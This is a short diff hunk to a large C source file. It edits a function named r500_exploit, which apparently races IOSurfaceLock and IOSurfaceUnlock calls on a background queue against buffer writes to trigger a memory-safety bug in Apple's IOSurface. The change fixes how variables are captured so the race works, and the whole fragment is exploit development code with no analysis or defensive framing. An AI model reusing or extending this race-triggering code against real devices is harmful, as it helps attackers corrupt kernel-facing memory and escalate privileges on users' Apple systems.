@@ -28222,14 +28222,15 @@ static void r500_exploit(void) {
         memset(base, 0xCC, alloc_sz);
 
         int lock_mismatches = 0;
-        volatile int go_lock = 0;
-        volatile int ul_done = 0;
+        __block volatile int go_lock = 0;
+        __block volatile int ul_done = 0;
+        __block IOSurfaceRef bl_surf = lock_surf;
 
         dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
             while (!go_lock) __asm__ volatile("yield");
             for (int i = 0; i < 5000; i++) {
-                IOSurfaceUnlock(lock_surf, 0, NULL);
-                IOSurfaceLock(lock_surf, 0, NULL);
+                IOSurfaceUnlock(bl_surf, 0, NULL);
+                IOSurfaceLock(bl_surf, 0, NULL);
             }
             ul_done = 1;
         });
